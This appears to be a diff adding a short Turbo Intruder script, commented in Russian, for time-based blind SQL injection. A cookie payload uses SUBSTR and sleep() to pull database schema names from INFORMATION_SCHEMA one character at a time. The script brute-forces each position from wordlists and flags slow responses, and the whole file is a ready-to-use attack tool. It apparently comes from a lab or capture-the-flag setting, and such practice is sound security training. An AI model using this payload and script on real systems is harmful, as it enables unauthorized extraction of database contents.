@@ -1,0 +1,19 @@
+# скрипт для Time-Based SQL Injection
+# payload Cookie: cook=cfcd208495d559ef66e7dff9f98764da' OR IF(SUBSTR((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1 OFFSET 1), %s, 1)='%s', sleep(1), 1) -- -
+
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=5,
+                           requestsPerConnection=100,
+                           pipeline=False
+                           )
+
+    for firstWord in open('/home/kali/numbers.txt'):
+       for secondWord in open('/home/kali/symbols.txt'):
+        engine.queue(target.req, [firstWord.rstrip(), secondWord.rstrip()])
+
+
+def handleResponse(req, interesting):
+    # currently available attributes are req.status, req.wordcount, req.length and req.response
+    if req.time > 2000000:
+        table.add(req)
